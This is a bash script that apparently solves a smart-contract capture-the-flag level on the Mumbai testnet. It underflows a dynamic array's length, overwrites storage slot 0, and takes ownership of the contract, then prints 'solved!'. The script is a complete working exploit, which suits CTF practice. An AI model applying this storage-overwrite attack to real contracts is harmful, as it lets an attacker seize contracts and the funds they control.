#!/bin/bash

PRIVATE_KEY="$1"
if [ -z "$PRIVATE_KEY" ]
then
    echo "PRIVATE_KEY must be passed as the first argument" >&2
    exit 1
fi

CONTRACT_ADDRESS="$2"
if [ -z "$CONTRACT_ADDRESS" ]
then
    echo "CONTRACT_ADDRESS must be passed as the second argument" >&2
    exit 1
fi

WALLET_ADDRESS="$(cast wallet address $PRIVATE_KEY)"

echo "[INFO] Making contact..." >&2
cast send \
    --rpc-url https://matic-mumbai.chainstacklabs.com \
    --private-key $PRIVATE_KEY \
    $CONTRACT_ADDRESS \
    "makeContact()"

echo "[INFO] Changing array length to 2**256..." >&2
cast send \
    --rpc-url https://matic-mumbai.chainstacklabs.com \
    --private-key $PRIVATE_KEY \
    $CONTRACT_ADDRESS \
    "retract()"

echo "[INFO] Computing codex data slot..." >&2
# codex array is at slot 1, so data is at keccak(0x0000000000000000000000000000000000000000000000000000000000000001)
SLOT=$(cast keccak 0x0000000000000000000000000000000000000000000000000000000000000001)

echo "[INFO] Computing owner index in codex array..." >&2
# owner is located at slot 0. Relative to codex data slot is at 2^256 - $SLOT
OWNER_INDEX=$(python -c "print(2**256 - $SLOT)")
echo $OWNER_INDEX

echo "[INFO] Setting new owner..." >&2
cast send \
    --rpc-url https://matic-mumbai.chainstacklabs.com \
    --private-key $PRIVATE_KEY \
    $CONTRACT_ADDRESS \
    "revise(uint256, bytes32)" \
    $OWNER_INDEX \
    $(echo $WALLET_ADDRESS | sed 's/0x/0x000000000000000000000000/')

echo "[INFO] Checking contract owner..." >&2
CONTRACT_OWNER=$(cast call \
    --rpc-url https://matic-mumbai.chainstacklabs.com \
    $CONTRACT_ADDRESS \
    "owner()(address)")

if [ "$CONTRACT_OWNER" == "$WALLET_ADDRESS" ]
then
    echo "solved!"
else
    echo "[ERROR] exploit failed" >&2
fi
